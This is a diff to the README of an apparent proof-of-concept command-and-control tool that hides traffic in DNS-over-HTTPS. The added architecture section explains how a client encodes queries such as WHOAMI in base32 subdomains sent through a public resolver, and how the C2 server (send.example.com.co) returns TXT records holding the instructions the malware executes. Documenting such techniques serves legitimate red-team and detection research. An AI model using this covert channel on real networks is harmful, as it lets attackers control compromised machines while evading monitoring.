@@ -3,6 +3,16 @@ This project provides a proof-of-concept implementation of a Command and Control
 DoH C2 allows for covert communication between the C2 server and the infected client machines by leveraging encrypted DNS queries
 thereby making the traffic appear legitimate and harder to detect by traditional network monitoring tools.
 
+# Architecture
+![image](https://github.com/user-attachments/assets/e0e0c705-e5a2-4934-b265-f70e39ca668b)  
+
+The python program on the client side sends HTTPS request (TCP/443) to DoH Server to resolve a destination domain where the c2 is hosted, e.g send.example.com.co using a  the legit DOH server, json query like https://dns.belnet.be/dns-query?name=google.com &type=TXT  
+An attacker can use the part which is between the name and ‘&’ to inject txt record which is not bigger than 512 bytes of size e.g https://dns.belnet.be/dns-query?name=SINGLE-1-K5EE6QKNJEFA====.send.example.com.co&type=TXT  
+'SINGLE-1-K5EE6QKNJEFA===='  => the base32 encoded query (K5EE6QKNJEFA====  is basically WHOAMI )  
+send.example.com.co => the DNS c2 server  
+The belnet.be is instructed to query the send.example.com.co DNS server for the TXT record.  
+The DNS server send.example.com.co then returns back txt record in which instructions are send what the client needs to perform next. Bellow is example it the answer section of the response are the instructions the client/malware will execute.  
+
 # Testing and Limitations
 This project is intended for educational purposes and authorized security research only. 
 Bypassing antivirus software or other security measures is not within the scope of this project. 
@@ -18,6 +28,9 @@ It is designed for testing in controlled environments to demonstrate the feasibi
 **Server and Client Implementation**: Includes both C2 server and client components.  
 
 Only google DoH is used.  
+
+# Scenario 1 - Using Public DoH Server
+![image](https://github.com/user-attachments/assets/d26b3309-d164-4344-8dcb-94c10e7e6291)
 
 # Initial setup
 For client side, linux is recommended but the code was tested on Windows 10 and seem to worked :)  
@@ -68,5 +81,5 @@ Example run:
 Note instead of the  examples.com.co you should use your domain name  
 Run: python3 doh_server.py
 
-# Architecture TODO
+
 # Detection Tips TODO
